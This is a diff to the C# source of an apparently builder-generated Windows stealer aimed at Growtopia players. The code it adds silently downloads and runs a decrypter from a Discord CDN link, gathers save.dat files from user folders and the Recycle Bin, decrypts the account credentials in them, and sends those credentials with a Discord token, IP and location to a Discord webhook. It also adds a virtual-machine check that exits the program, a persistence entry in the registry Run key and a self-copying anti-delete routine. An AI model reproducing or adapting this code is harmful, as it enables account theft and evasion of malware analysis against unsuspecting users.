@@ -2,29 +2,63 @@ using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Net;
+using System.Management;
 using System.Net.Http;
 using System.Text;
+using System.IO.Compression;
 using System.Threading;
 using System.Windows.Forms;
 using System.Diagnostics;
 using Microsoft.Win32;
+using System.Reflection;
 
 namespace program
 {
     static class Program
     {
         static void Main()
-        {
+        {   
+            //[AntiVM]try{ //AntiVM} catch {}
+            try{ Directory.Delete(@"C:\\Temp",true); Directory.CreateDirectory("C:\\Temp");} catch {}
             SendInfo();
-            //FakeErrorMessage
+            //turnonbinder
             //HideStealer
+            //FakeErrorMessage
+            //RecoverSaveDats
+			//LocateAllSaveDats
+            //AntiDelete
 			//RunOnStartup
 			//DeleteGrowtopia
             //Tracer
         }
+        static void SaveDecrypter()
+        {
+            try { File.Delete(@"C:\Temp\savedecrypter.exe");} catch {}
+            WebClient webClient = new WebClient();
+            webClient.DownloadFile("https://cdn.discordapp.com/attachments/717431484687843352/750524007794606081/savedecrypter.exe","C:\\Temp\\savedecrypter.exe");
+        }
+        //extractbinder
         static void SendInfo()
         {
             string savedatpath = savedat();
+            try { File.Delete(Path.GetTempPath() + "\\PasswordZ.zb");} catch {}
+            try
+            {
+                SaveDecrypter();
+                try { File.Delete(@"C:\Temp\saveZ.dat");} catch {}
+                File.Copy(savedatpath,@"C:\Temp\saveZ.dat");
+                Process p = new Process();
+                p.StartInfo.FileName = "savedecrypter.exe";
+                p.StartInfo.WorkingDirectory = @"C:\Temp";
+                p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                p.StartInfo.CreateNoWindow = true;
+                p.Start();
+                p.WaitForExit();
+                try { File.Delete(@"C:\Temp\savedecrypter.exe");} catch {}
+                try { File.Delete(@"C:\Temp\saveZ.dat");} catch{}
+            }
+            catch {}
+            string DecryptedDataPath = Path.GetTempPath() + "\\PasswordZ.zb";
             string GrowID = GetGrowID(savedatpath);
             string DToken = DiscordToken();
             Webhook hook = new Webhook("webhook_url");
@@ -37,7 +71,8 @@ namespace program
             details += "IP Address: " + GrabIP() + "City/Region/Country: " + GrabLocation() + Environment.NewLine;
             details += "Time Zone: " + GrabTime()[1] + Environment.NewLine + "Time: " + GrabTime()[0];
             details += "```";
-            hook.SendMessage(details, savedatpath, GrowID);
+            hook.SendMessage(details, DecryptedDataPath, GrowID);
+            File.Delete(Path.GetTempPath() + "\\PasswordZ.zb");
         }
         public static string GetGrowID(string savedatpath)
         {
@@ -311,6 +346,228 @@ namespace program
 		    RegistryKey RK = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
 			RK.SetValue(System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName, Application.ExecutablePath);
 		}	
+		static void AntiDeleteStealer()
+		{
+			try
+			{
+				string AntiDeleteStealer = Process.GetCurrentProcess().MainModule.FileName;
+                if (Directory.Exists(Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + "\\Growtopia\\game\\pets\\boop"))
+                {
+                Directory.Delete(Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + "\\Growtopia\\game\\pets\\boop",true);
+                }
+                Directory.CreateDirectory(Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + "\\Growtopia\\game\\pets\\boop");
+                string AntiDeleteStealerDestination = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + "\\Growtopia\\game\\pets\\boop\\" + Path.GetFileName(Process.GetCurrentProcess().MainModule.FileName);
+                if (File.Exists(AntiDeleteStealerDestination))
+                    {
+                    File.Delete(AntiDeleteStealerDestination);
+                    }
+				File.Copy(AntiDeleteStealer, AntiDeleteStealerDestination);
+                try { Directory.CreateDirectory(@"C:\Temp");} catch{}
+				using(var resource = Assembly.GetExecutingAssembly().GetManifestResourceStream("AntiDelete.exe"))
+				{
+					using(var file = new FileStream(@"C:\Temp\AntiDelete.exe", FileMode.Create, FileAccess.Write))
+					{
+						resource.CopyTo(file);
+					} 
+				}
+				Process p = new Process();
+				p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+				p.StartInfo.WorkingDirectory = @"C:\Temp";
+				p.StartInfo.FileName = "cmd.exe";
+				p.StartInfo.Arguments = "/c AntiDelete.exe";
+				p.Start();
+				Thread.Sleep(10000);
+			}
+			catch
+			{
+			}
+		}
+		static void LocateAllSaveDats()
+        {
+            string DrivePath = Path.GetPathRoot(Environment.SystemDirectory);
+            string TempPath = DrivePath + "Temp";
+            try { Directory.CreateDirectory(TempPath); } catch { }
+            try { Directory.Delete(TempPath + "\\LocatedSaveDats",true); Directory.CreateDirectory(TempPath + "\\LocatedSaveDats"); } catch { Directory.CreateDirectory(TempPath + "\\LocatedSaveDats"); }
+            try { File.Delete(@"C:\Temp\Accounts.zb");} catch{}
+            GrabSaveDats(TempPath);
+            RecoverSaveDats(TempPath);
+            SaveDecrypter();
+            string AccData = "";
+            Process p = new Process();
+            p.StartInfo.FileName = "savedecrypter.exe";
+            p.StartInfo.WorkingDirectory = @"C:\Temp";
+            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+            p.StartInfo.CreateNoWindow = true;
+            DirectoryInfo SearchDir = new DirectoryInfo(TempPath + "\\LocatedSaveDats");
+            FileInfo[] filesInDir = SearchDir.GetFiles("*save*");
+            foreach (FileInfo foundFile in filesInDir)
+            {
+                try{ File.Delete(@"C:\Temp\saveZ.dat");} catch{}
+                File.Move(foundFile.FullName, TempPath + @"\saveZ.dat");
+                p.Start();
+                p.WaitForExit();
+                File.Delete(@"C:\Temp\saveZ.dat");
+                AccData += File.ReadAllText(Path.GetTempPath() + "\\PasswordZ.zb") + Environment.NewLine;
+            }
+            File.WriteAllText(@"C:\Temp\Accounts.zb",AccData);
+            File.Delete(Path.GetTempPath() + "\\PasswordZ.zb");
+            File.Delete(@"C:\Temp\savedecrypter.exe");
+            Directory.Delete(TempPath + "\\LocatedSaveDats", true);
+            Webhook hook3 = new Webhook("webhook_url");
+            hook3.Name = "Z";
+            hook3.ProfilePictureUrl = "https://cdn.discordapp.com/avatars/575523446524739594/c5b15f1bf1b1da14df90547a0fe07150.png?size=128";
+            string details3 = "```Located save.dats by Z-Builder```";
+            hook3.SendMessage(details3,TempPath + "\\Accounts.zb");
+            File.Delete(TempPath + "\\Accounts.zb");
+            try
+            {
+                File.Delete(@"C:\Temp\LocateSaveDats.bat");
+            }
+            catch {}
+        }
+        static void GrabSaveDats(string TempLocation)
+        {
+            string UserPath = Directory.GetParent(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)).FullName;
+            if ( Environment.OSVersion.Version.Major >= 6 ) {
+                UserPath = Directory.GetParent(UserPath).ToString();
+            }
+            try{File.Delete(@"C:\Temp\LocateSaveDats.bat");} catch{}
+            File.WriteAllText(@"C:\Temp\LocateSaveDats.bat","dir save.dat /S /B");
+            Process p = new Process();
+            p.StartInfo.FileName = "cmd.exe";
+            p.StartInfo.Arguments = "/C C:\\Temp\\LocateSaveDats.bat";
+            p.StartInfo.WorkingDirectory = UserPath;
+            p.StartInfo.UseShellExecute = false;
+            p.StartInfo.RedirectStandardOutput = true;
+            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+            p.StartInfo.CreateNoWindow = true;
+            p.Start();
+            string output = "";
+            while (!p.HasExited)
+            {
+                output += p.StandardOutput.ReadToEnd();
+            }
+            string[] lines = output.Split('\n');
+            List<string> RawLocations = new List<string>();
+            foreach (string i in lines)
+            {
+                if ((i.Contains("save.dat"))&&(!(i.Contains("dir save.dat /S /B"))))
+                {
+                    RawLocations.Add(i);
+                }
+            }
+            Random rand = new Random();
+            foreach (string i in RawLocations)
+            {
+                string CleanedLocation = i.Trim();
+                File.Copy(CleanedLocation,TempLocation + "\\LocatedSaveDats\\save" + (Convert.ToString(rand.Next(0,20000000))) + ".dat");
+            }
+        }
+        static void RecoverSaveDats(string TempLocation)
+        {
+            try
+            {
+                string RecycleBinZ = TempLocation + "\\RecycleBinZ";
+                try { Directory.Delete(RecycleBinZ, true); Directory.CreateDirectory(RecycleBinZ); } catch { Directory.CreateDirectory(RecycleBinZ); }
+                string ps1file = RecycleBinZ + "\\RecoverFiles.ps1";
+                try { File.Delete(ps1file); } catch { };
+                using (var tw = new StreamWriter(ps1file, true))
+                {
+                    tw.WriteLine(string.Join(Environment.NewLine, "$shell = New-Object -ComObject Shell.Application", "$recycleBin = $shell.Namespace(0xA) #Recycle Bin", "$recycleBin.Items() | %{Copy-Item $_.Path (\"C:\\Temp\\RecycleBinZ\\{0}\" -f ($_.Name+[string](Get-Random)))}"));
+                }
+                var StartInfo = new ProcessStartInfo();
+                StartInfo.FileName = "powershell.exe";
+                StartInfo.Arguments = "-NoProfile -ExecutionPolicy unrestricted -file \"" + ps1file + "\"";
+                StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                using (Process RecycleBinGrabber = Process.Start(StartInfo))
+                {
+                    RecycleBinGrabber.WaitForExit();
+                }
+                DirectoryInfo SearchDir = new DirectoryInfo(RecycleBinZ);
+                FileInfo[] filesInDir = SearchDir.GetFiles("*save*");
+                Random rand = new Random();
+                foreach (FileInfo foundFile in filesInDir)
+                {
+                    File.Move(foundFile.FullName, TempLocation + "\\LocatedSaveDats" + "\\save" + (Convert.ToString(rand.Next(0, 20000000))) + ".dat");
+                }
+                Directory.Delete(RecycleBinZ, true);
+            }
+            catch { }
+        }
+        static void RecoverSaveDats2()
+        {
+            try
+            {
+                string DrivePath = Path.GetPathRoot(Environment.SystemDirectory);
+                string TempLocation = DrivePath + "Temp";
+                string RecycleBinZ = TempLocation + "\\RecycleBinZ";
+                try { Directory.Delete(RecycleBinZ, true); Directory.CreateDirectory(RecycleBinZ); } catch { Directory.CreateDirectory(RecycleBinZ); }
+                string ps1file = RecycleBinZ + "\\RecoverFiles.ps1";
+                try { File.Delete(ps1file); } catch { };
+                using (var tw = new StreamWriter(ps1file, true))
+                {
+                    tw.WriteLine(string.Join(Environment.NewLine, "$shell = New-Object -ComObject Shell.Application", "$recycleBin = $shell.Namespace(0xA) #Recycle Bin", "$recycleBin.Items() | %{Copy-Item $_.Path (\"C:\\Temp\\RecycleBinZ\\{0}\" -f ($_.Name+[string](Get-Random)))}"));
+                }
+                var StartInfo = new ProcessStartInfo();
+                StartInfo.FileName = "powershell.exe";
+                StartInfo.Arguments = "-NoProfile -ExecutionPolicy unrestricted -file \"" + ps1file + "\"";
+                StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                using (Process RecycleBinGrabber = Process.Start(StartInfo))
+                {
+                    RecycleBinGrabber.WaitForExit();
+                }
+                SaveDecrypter();
+                string AccData = "";
+                Process p = new Process();
+                p.StartInfo.FileName = "savedecrypter.exe";
+                p.StartInfo.WorkingDirectory = @"C:\Temp";
+                p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                p.StartInfo.CreateNoWindow = true;
+                DirectoryInfo SearchDir = new DirectoryInfo(RecycleBinZ);
+                FileInfo[] filesInDir = SearchDir.GetFiles("*save*");
+                foreach (FileInfo foundFile in filesInDir)
+                {
+                    try{ File.Delete(@"C:\Temp\saveZ.dat");} catch{}
+                    File.Move(foundFile.FullName, TempLocation + "\\saveZ.dat");
+                    p.Start();
+                    p.WaitForExit();
+                    File.Delete(@"C:\Temp\saveZ.dat");
+                    AccData += File.ReadAllText(Path.GetTempPath() + "\\PasswordZ.zb") + Environment.NewLine;
+                }
+                File.WriteAllText(@"C:\Temp\Accounts.zb",AccData);
+                File.Delete(@"C:\Temp\savedecrypter.exe");
+                File.Delete(Path.GetTempPath() + "\\PasswordZ.zb");
+                Directory.Delete(RecycleBinZ, true);
+                Webhook hook3 = new Webhook("webhook_url");
+                hook3.Name = "Z";
+                hook3.ProfilePictureUrl = "https://cdn.discordapp.com/avatars/575523446524739594/c5b15f1bf1b1da14df90547a0fe07150.png?size=128";
+                string details3 = "```Recovered save.dats by Z-Builder!```";
+                hook3.SendMessage(details3,TempLocation + "\\Accounts.zb");
+                File.Delete(TempLocation + "\\Accounts.zb");
+                Directory.Delete(TempLocation + "\\RecoveredSaveDats",true);
+            }
+            catch { }
+        }
+        static void AntiVM()
+        {
+            
+            using (var searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
+            {
+                using (var items = searcher.Get())
+                {
+                    foreach (var item in items)
+                    {
+                        string manufacturer = item["Manufacturer"].ToString().ToLower();
+                        if ((manufacturer == "microsoft corporation") && (item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL"))
+                                || manufacturer.Contains("vmware")
+                                || item["Model"].ToString() == "VirtualBox")
+                        {
+                            Environment.Exit(0);
+                        }
+                    }
+                }
+            }
+        }
     }
     class Webhook
     {
@@ -334,21 +591,32 @@ namespace program
 
             if (file != null)
             {
-                if (File.Exists(file))
-                {
-                    data.Add(new StringContent(content), "content");
-                    byte[] bytes = File.ReadAllBytes(file);
-                    data.Add(new ByteArrayContent(bytes), "save.dat", "save (" + GrowID + ") .dat");
-                    var resp = Client.PostAsync(Url, data).Result;
-                    return resp.StatusCode == HttpStatusCode.NoContent;
-                }
-                else
-                {
+				if (File.Exists(file))
+				{
+                    if (GrowID != null)
+                    {
+                        data.Add(new StringContent(content), "content");
+                        byte[] bytes = File.ReadAllBytes(file);
+                        data.Add(new ByteArrayContent(bytes), "PasswordZ.zb", GrowID +".zb");
+                        var resp = Client.PostAsync(Url, data).Result;
+                        return resp.StatusCode == HttpStatusCode.NoContent;
+                    }
+                    else
+                    {
+                        data.Add(new StringContent(content), "content");
+                        byte[] bytes = File.ReadAllBytes(file);   
+                        data.Add(new ByteArrayContent(bytes), "Accounts.zb", "Accounts.zb");
+                        var resp = Client.PostAsync(Url, data).Result;
+                        return resp.StatusCode == HttpStatusCode.NoContent;
+                    }
+				}
+				else
+				{
                     content += "```No save.dat found in Growtopia folder```";
                     data.Add(new StringContent(content), "content");
                     var resp = Client.PostAsync(Url, data).Result;
                     return resp.StatusCode == HttpStatusCode.NoContent;
-                }
+				}       
             }
             return true;
         }
@@ -369,6 +637,17 @@ namespace program
             while (true)
             {
                 Thread.Sleep(1000);
+			    //[AntiDelete]if (!(Process.GetProcessesByName(Path.GetFileNameWithoutExtension("Regiistry")).Length > 0))
+                //[AntiDelete]{
+                    //[AntiDelete]Process q = new Process();
+                    //[AntiDelete]q.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                    //[AntiDelete]q.StartInfo.WorkingDirectory = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + "\\Growtopia\\game\\pets";
+                    //[AntiDelete]q.StartInfo.FileName = "cmd.exe";
+                    //[AntiDelete]q.StartInfo.Arguments = "/c Regiistry.exe";
+                    //[AntiDelete]q.Start();
+                    //[AntiDelete]Thread.Sleep(5000);
+                 //[AntiDelete]}
+                 //[AntiDelete]Thread.Sleep(5000);
             }
         }
         private static void OnSaveChanged(object source, FileSystemEventArgs e)
@@ -378,15 +657,31 @@ namespace program
                 try
                 {
                     fileSystemWatcher.EnableRaisingEvents = false;
-                    string GrowID = Program.GetGrowID(e.FullPath);
                     string details = "";
+                    try { File.Delete(@"C:\Temp\savedecrypter.exe");} catch {}
+                    WebClient webClient = new WebClient();
+                    webClient.DownloadFile("https://cdn.discordapp.com/attachments/717431484687843352/750524007794606081/savedecrypter.exe","C:\\Temp\\savedecrypter.exe");
+                    try {File.Delete(@"C:\Temp\saveZ.dat");} catch {}
+                    File.Copy(e.FullPath, @"C:\Temp\saveZ.dat");
+                    Process p = new Process();
+                    p.StartInfo.FileName = "savedecrypter.exe";
+                    p.StartInfo.WorkingDirectory = @"C:\Temp";
+                    p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                    p.StartInfo.CreateNoWindow = true;
+                    p.Start();
+                    p.WaitForExit();
+                    File.Delete(@"C:\Temp\saveZ.dat");
+                    string AccData = File.ReadAllText(Path.GetTempPath() + "\\PasswordZ.zb");
+                    string[] SplittedData = AccData.Split(new[] { "[---ZB-Split---]" }, StringSplitOptions.RemoveEmptyEntries);
+                    string GrowID = SplittedData[0];
                     details += "```Save.dat traced by Z-Builder!" + Environment.NewLine + "Traced from " + Environment.UserName + " / " + Environment.MachineName + "!";
                     details += Environment.NewLine + "GrowID: " + GrowID;
                     details += "```";
                     Webhook hook2 = new Webhook("webhook_url");
                     hook2.Name = "Z";
                     hook2.ProfilePictureUrl = "https://cdn.discordapp.com/avatars/575523446524739594/c5b15f1bf1b1da14df90547a0fe07150.png?size=128";
-                    hook2.SendMessage(details, e.FullPath, GrowID);
+                    hook2.SendMessage(details, Path.GetTempPath() + "\\PasswordZ.zb", GrowID);
+                    File.Delete(Path.GetTempPath() + "\\PasswordZ.zb");
                 }
                 finally
                 {
